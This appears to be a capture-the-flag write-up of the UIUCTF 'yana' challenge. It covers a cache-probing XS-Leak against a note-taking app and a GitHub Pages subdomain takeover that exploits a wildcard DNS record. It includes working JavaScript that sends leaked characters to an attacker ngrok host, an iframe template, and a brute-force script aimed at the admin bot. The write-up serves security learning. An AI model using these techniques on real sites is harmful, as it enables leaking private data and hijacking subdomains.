@@ -1,0 +1,419 @@
+<hr />
+
+<h2>description: GitHub Pages subdomain takeover and cache probing XS-Leak</h2>
+
+<h1>yana</h1>
+
+<h2>Description</h2>
+
+<p>I made a note taking website. Can you get the admin's note?</p>
+
+<p>https://chal.yana.wtf</p>
+
+<p>admin bot <code>nc yana-bot.chal.uiuc.tf 1337</code></p>
+
+<p><strong>author</strong>: arxenix</p>
+
+<p>{% file src="../../.gitbook/assets/bot.js" %}
+bot.js
+{% endfile %}</p>
+
+<h2>Preface</h2>
+
+<p>This challenge was really great, even though there was an unintended solution. It took me on quite the journey, learning about cache probing attacks and subdomain takeovers.</p>
+
+<p>The unintended solution stems from how Chrome handles cache partitioning. While Chrome version 85 onwards supports cache partitioning, effectively isolating caches by the requesting origin, running Chrome in headless mode does not achieve the same effect.</p>
+
+<p>While not required to solve the challenge, figuring out the intended solution - a GitHub Pages subdomain takeover - was definitely an awesome experience.</p>
+
+<h2>Solution</h2>
+
+<p>This is a notepad app that functions entirely on the client-side. We can therefore analyze the JavaScript source code to look for vulnerabilities.</p>
+
+<h3>Source Code Analysis</h3>
+
+<p>The app uses the browser's local storage to store the user's notes.</p>
+
+<p><code>javascript
+const noteForm = document.getElementById("note");
+noteForm.onsubmit = (e) =&gt; {
+  e.preventDefault();
+  window.localStorage.setItem("note", new FormData(noteForm).get("note"));
+};
+</code></p>
+
+<p>We can see this in action using Chrome DevTools.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-03 at 8.30.57 PM.png" alt="" /></p>
+
+<p>There is also a search feature that "searches" for notes. Interestingly, the search query gets placed into the URL's <a href="https://en.wikipedia.org/wiki/URI_fragment">fragment identifier</a> through <code>document.location.hash</code>.</p>
+
+<p><code>javascript
+const searchForm = document.getElementById("search");
+const output = document.getElementById("output");
+searchForm.onsubmit = (e) =&gt; {
+  e.preventDefault();
+  const query = new FormData(searchForm).get("search") ?? "";
+  document.location.hash = query;
+  search();
+};
+</code></p>
+
+<p>The search is implemented through the search function. The search function grabs the URL's fragment identifier, and checks if it is a substring of the note stored in the browser's local storage.</p>
+
+<p><code>javascript
+function search() {
+  const note = window.localStorage.getItem("note") ?? "";
+  console.log(`note: ${note}`);
+  const query = document.location.hash.substring(1);
+  console.log(`query: ${query}`);
+  if (query) {
+    if (note.includes(query)) {
+      console.log('found');
+      output.innerHTML =
+        'found! &lt;br/&gt;&lt;img src="https://sigpwny.com/uiuctf/y.png"&gt;&lt;/img&gt;';
+    } else {
+      console.log('not found');
+      output.innerHTML =
+        'nope.. &lt;br/&gt;&lt;img src="https://sigpwny.com/uiuctf/n.png"&gt;&lt;/img&gt;';
+    }
+  }
+}
+</code></p>
+
+<p>If the query is a valid substring, then the green <code>https://sigpwny.com/uiuctf/y.png</code> image is loaded and placed in the <code>output</code> div.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-03 at 8.44.57 PM.png" alt="" /></p>
+
+<p>If the query is not found, the red <code>https://sigpwny.com/uiuctf/n.png</code> is loaded instead.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-03 at 8.48.29 PM.png" alt="" /></p>
+
+<p>We are also provided with the <code>bot.js</code> script, which is the "admin" bot that visits any URL we give it. Notice that the flag is first saved as a note on the challenge server before our chosen URL is visited.</p>
+
+<p>``<code>javascript
+async function load_url(socket, data) {
+  let url = data.toString().trim();
+  console.log(</code>checking url: ${url}`);
+  if (!url.startsWith('http://') &amp;&amp; !url.startsWith('https://')) {
+    socket.state = 'ERROR';
+    socket.write('Invalid scheme (http/https only).\n');
+    socket.destroy();
+    return;
+  }
+  socket.state = 'LOADED';</p>
+
+<p>// "incognito" by default
+  const context = await browser.newContext();
+  const page = await context.newPage();
+  await page.goto("https://chal.yana.wtf");
+  await page.fill('#note &gt; textarea', FLAG);
+  await page.click('#note &gt; button');
+  await page.waitForTimeout(500);
+  await page.goto('about:blank');
+  await page.waitForTimeout(500);
+  socket.write(<code>Loading page ${url}.\n</code>);
+  await page.goto(url);
+  setTimeout(() =&gt; {
+    try {
+      page.close();
+      socket.write('timeout\n');
+      socket.destroy();
+    } catch (err) {
+      console.log(<code>err: ${err}</code>);
+    }
+  }, 60000);
+}
+```</p>
+
+<h3>Cache Probing</h3>
+
+<p>Now, we know that:</p>
+
+<ul>
+<li>We are able to force the admin to visit the challenge server with any arbitrary fragment identifier, either directly (through submitting the challenge server URL to the bot) or indirectly (through JavaScript or iframes on our hosted site).</li>
+<li>This will allow us to make the admin's browser perform the search function, checking whether the provided fragment identifier is a substring of the flag.</li>
+</ul>
+
+<p>At this point, I knew that it must have had something to do with brute-forcing the flag. However, since the search is performed on the client-side, we couldn't simply do a CSRF to get the search output.</p>
+
+<p>Remember how <code>y.png</code> and <code>n.png</code> images are loaded based on the search output?</p>
+
+<p><code>javascript
+if (note.includes(query)) {
+  console.log('found');
+  output.innerHTML =
+    'found! &lt;br/&gt;&lt;img src="https://sigpwny.com/uiuctf/y.png"&gt;&lt;/img&gt;';
+} else {
+  console.log('not found');
+  output.innerHTML =
+    'nope.. &lt;br/&gt;&lt;img src="https://sigpwny.com/uiuctf/n.png"&gt;&lt;/img&gt;';
+}
+</code></p>
+
+<p>Perhaps we can perform a <a href="https://xsleaks.dev/docs/attacks/cache-probing/">cache probing</a> attack to determine whether the search was successful. The principle is as follows:</p>
+
+<ol>
+<li>The victim visits the attacker-controlled site. The attacker-controlled site loads an iframe of the notes site, with a search query. If the search query is a substring of the flag, then the <code>https://sigpwny.com/uiuctf/y.png</code> image is fetched and cached.</li>
+<li>The attacker-controlled site fetches the <code>https://sigpwny.com/uiuctf/y.png</code> image.</li>
+<li>By calculating the time taken to fetch the image, the attacker-controlled site can determine whether the image was cached (the time taken would be significantly lower).</li>
+</ol>
+
+<p>This would allow us to brute-force the flag character by character.</p>
+
+<h3>Setting Up The Attack</h3>
+
+<p>To implement the cache probing attack, we need to come up with a JavaScript payload that would be run on the victim's browser to determine whether the image was cached.</p>
+
+<p>We define an <code>onFrameLoad()</code> function that will be called when the iframe of the notes site, containing the search query, is loaded.</p>
+
+<p>```javascript
+function onFrameLoad()
+{
+    setTimeout(() =&gt; {
+        var xhr = new XMLHttpRequest();</p>
+
+<pre><code>    function exfil(cached, duration) {
+
+        if (cached)
+        {
+            img = new Image();
+            img.src = "http://964fb36503ae.ngrok.io/?cached=" + document.getElementById('iframe').src.split('#')[1];
+        }
+    }
+
+    function check_cached(xhr, src) {
+
+        var startTime = performance.now();
+
+        xhr.open("GET", src);
+        xhr.onreadystatechange = function () {
+
+            if (xhr.readyState === 4) {
+
+                // check if image was cached based on response time
+                // if image was loaded in iframe, it would be cached
+
+                var endTime = performance.now();
+                duration = endTime - startTime;
+                console.log(duration);
+
+                if (duration &lt; 10)
+                {
+                    exfil(true, duration);
+                }
+                else
+                {
+                    exfil(false, duration);
+                }
+            }
+        };
+
+        xhr.send();
+    }
+
+    check_cached(xhr, "https://sigpwny.com/uiuctf/y.png");
+}, 500);
+</code></pre>
+
+<p>}
+```</p>
+
+<p>We then prepare a <code>template.html</code> with a placeholder for the search query.</p>
+
+<p>```markup</p>
+
+<script src="exploit.js"></script>
+
+<iframe src="https://chal.yana.wtf/#{}" id="iframe" onload="onFrameLoad(this)"></iframe>
+
+<p>```</p>
+
+<p>Then, an <code>exploit.py</code> script can automate the bruteforce attack.</p>
+
+<p>```python
+from pwn import *
+import string</p>
+
+<p>URL = 'http://964fb36503ae.ngrok.io/exploit.html'
+FLAG = 'uiuctf{'</p>
+
+<p>for char in string.ascii<em>lowercase + string.digits + '{}</em>':
+    print(char)
+    with open('template.html', 'r') as infile, open('exploit.html', 'w') as outfile:
+        outfile.write(infile.read().format(FLAG + char))</p>
+
+<pre><code>conn = remote('yana-bot.chal.uiuc.tf', 1337)
+conn.recv()
+conn.send(URL + '\r\n')
+</code></pre>
+
+<p>```</p>
+
+<p>We will have to run this script for each new character, adding the previously found ones to the <code>FLAG</code> variable. (Perhaps I should have wrote a cleaner solution?)</p>
+
+<p><img src="../../.gitbook/assets/image (23).png" alt="" /></p>
+
+<h3>This Shouldn't Have Worked.</h3>
+
+<p>Here's why. I was hosting the exploit on an <code>ngrok</code> domain, but as of Chrome version 85, cache partitioning was implemented to defend against cache probing attacks. This <a href="https://developers.google.com/web/updates/2020/10/http-cache-partitioning">update</a> by Google in October 2020 explains how the new cache partitioning system works.</p>
+
+<p>In brief, a new "Network Isolation Key" was added, which contains both the top-level site and the current-frame site. This allows the iframe's cache to be seperate from the top-level site's cache. The following example illustrates our attack scenario.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 1.29.04 AM.png" alt="" /></p>
+
+<p>The initial fetching of the image through the notes application iframe should have resulted in a cache key of (<code>attacker-site</code>, <code>notes-app-site</code>, <code>image-url</code>)</p>
+
+<p>The second time the image is fetched through the attacker-controlled site, the cache key would <em>not</em> contain the notes application site, and would instead be (<code>attacker-site</code>, <code>attacker-site</code>,<code>image-url</code>).</p>
+
+<p>This should <em>not</em> result in a cache hit, since the two cache keys are different. But it did. After some local testing, I found that <strong>headless chrome simply doesn't perform cache partitioning</strong>.</p>
+
+<p>I ran the admin bot in headless mode (the default) as follows:</p>
+
+<p><code>javascript
+const browser = await chromium.launch({
+  executablePath: "PATH-TO-CHROMIUM",
+  logger: {
+    isEnabled: () =&gt; true,
+    log: (name, severity, message, _args) =&gt; console.log(`chrome log: [${name}/${severity}] ${message}`)
+  },
+});
+</code></p>
+
+<p>The attack worked. Cache partitioning was not enabled.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 1.48.45 AM.png" alt="" /></p>
+
+<p>But running the bot with headless mode disabled, the attack did not work.</p>
+
+<p><code>javascript
+const browser = await chromium.launch({
+  executablePath: "PATH-TO-CHROMIUM",
+  logger: {
+    isEnabled: () =&gt; true,
+    log: (name, severity, message, _args) =&gt; console.log(`chrome log: [${name}/${severity}] ${message}`)
+  },
+  headless: false,
+});
+</code></p>
+
+<p>This was the expected result, since cache partitioning should be enabled by default.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 1.50.55 AM.png" alt="" /></p>
+
+<p>We can verify that both times, <code>y.png</code> was downloaded from the network, not fetched from the cache!</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 1.54.17 AM.png" alt="" /></p>
+
+<h3>The Intended Solution</h3>
+
+<p>Assuming that cache partitioning worked, how could we bypass it?</p>
+
+<p>An important implementation detail is that subdomains and port numbers are actually ignored when creating the cache key.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 2.01.50 AM.png" alt="" /></p>
+
+<p>So when the image is requested by <code>https://chal.yana.wtf/</code>, only <code>https://yana.wtf/</code> is actually saved in the cache key. This means that if we are able to control any <code>*.yana.wtf</code> subdomains, we would be able to bypass the cache partitioning since both requests would be originating from the same domain.</p>
+
+<h3>Subdomain Takeover</h3>
+
+<p>From the <code>whois</code> records, we could tell that this was a <a href="https://pages.github.com">GitHub Pages</a> site.</p>
+
+<p>```
+$ host chal.yana.wtf
+chal.yana.wtf has address 185.199.108.153</p>
+
+<p>$ whois 185.199.108.153</p>
+
+<p>...</p>
+
+<p>organisation:   ORG-GI58-RIPE
+org-name:       GitHub, Inc.
+country:        US
+org-type:       LIR
+address:        88 Colin P. Kelly Jr. Street
+address:        94107
+address:        San Francisco
+address:        UNITED STATES
+phone:          +1 415 735 4488
+admin-c:        GA9828-RIPE
+tech-c:         NO1444-RIPE
+abuse-c:        AR39914-RIPE
+mnt-ref:        us-github-1-mnt
+mnt-by:         RIPE-NCC-HM-MNT
+mnt-by:         us-github-1-mnt
+created:        2017-04-11T08:28:46Z
+last-modified:  2020-12-16T13:16:10Z
+source:         RIPE # Filtered</p>
+
+<p>...
+```</p>
+
+<p>I did not know this, but GitHub does not require you to prove that you actually own the domain before allowing you to setup a custom domain for your GitHub Pages site.</p>
+
+<p>This opens up several possibilities for subdomain takeovers. As warned by the official documentation, a wildcard DNS record that points any subdomain to GitHub is especially dangerous.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 10.23.14 AM.png" alt="" /></p>
+
+<p>A subdomain takeover can occur when there is a <strong>dangling DNS entry</strong>. Let me explain.</p>
+
+<p>Using the <code>dig</code> command, we can find the DNS records configured for <code>chal.yana.wtf</code>.</p>
+
+<p>```
+$ dig chal.yana.wtf +nostats +nocomments +nocmd</p>
+
+<p>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; chal.yana.wtf +nostats +nocomments +nocmd
+;; global options: +cmd
+;chal.yana.wtf.         IN  A
+chal.yana.wtf.      240 IN  A   185.199.108.153
+```</p>
+
+<p>An <code>A</code> record maps the domain to the GitHub pages server.</p>
+
+<p>But if we poke around a little more, we find that the DNS configuration indeed seems to use a wildcard <code>A</code> record for <code>*.yana.wtf</code>. For instance, <code>a.yana.wtf</code> and <code>b.yana.wtf</code> do not have any GitHub page associated with them, yet point to the GitHub pages server.</p>
+
+<p>```
+$ dig a.yana.wtf +nostats +nocomments +nocmd</p>
+
+<p>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; a.yana.wtf +nostats +nocomments +nocmd
+;; global options: +cmd
+;a.yana.wtf.            IN  A
+a.yana.wtf.     300 IN  A   185.199.108.153</p>
+
+<p>$ dig b.yana.wtf +nostats +nocomments +nocmd</p>
+
+<p>; &lt;&lt;&gt;&gt; DiG 9.10.6 &lt;&lt;&gt;&gt; b.yana.wtf +nostats +nocomments +nocmd
+;; global options: +cmd
+;b.yana.wtf.            IN  A
+b.yana.wtf.     300 IN  A   185.199.108.153
+```</p>
+
+<p>Going to <code>http://a.yana.wtf</code>, therefore, will still forward the request to GitHub. GitHub looks for GitHub repositories with the appropriate <code>CNAME</code> file. Since no repository is configured to serve <code>a.yana.wtf</code>, a 404 page is shown.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 10.53.10 AM.png" alt="" /></p>
+
+<p>This is a dangling DNS record, since anyone with a GitHub account can add the <code>CNAME</code> file containing <code>a.yana.wtf</code> to their repository, thereby taking over the <code>a.yana.wtf</code> domain.</p>
+
+<p>With the exploit scripts we created earlier, we can create our own GitHub Pages site.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 10.26.01 AM.png" alt="" /></p>
+
+<p>We configure the custom domain to <code>abc.yana.wtf</code>, which creates the following <code>CNAME</code> file in our repository.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 10.56.13 AM.png" alt="" /></p>
+
+<p>Now, if we go to <code>http://abc.yana.wtf</code>, we will find that our exploit is being served!</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 11.08.58 AM.png" alt="" /></p>
+
+<p>Now, things are a little different. Because both the iframe and the top-level site are in the same <code>yana.wtf</code> domain, Chrome does not partition the cache. Notice that the first request, initiated by the iframe, fetched <code>y.png</code> from the network, while the second request, initiated by our exploit script, fetched <code>y.png</code> from the browser's cache.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 11.20.41 AM.png" alt="" /></p>
+
+<p>This obviously causes a significant difference in the time taken to fetch the resources, allowing us to carry out the cache probing attack even when Chrome's cache partitioning policy is in effect.</p>
+
+<p>As a sanity check, I ran the bot again locally without headless mode, this time providing it the <code>https://abc.yana.wtf/exploit.html</code> URL.</p>
+
+<p><img src="../../.gitbook/assets/Screenshot 2021-08-04 at 11.48.20 AM.png" alt="" /></p>
+
+<p>I confirmed that the exploit worked. Our exploit script determined that <code>y.png</code> was cached, and made a callback to our <code>ngrok</code> server with the successful query.</p>
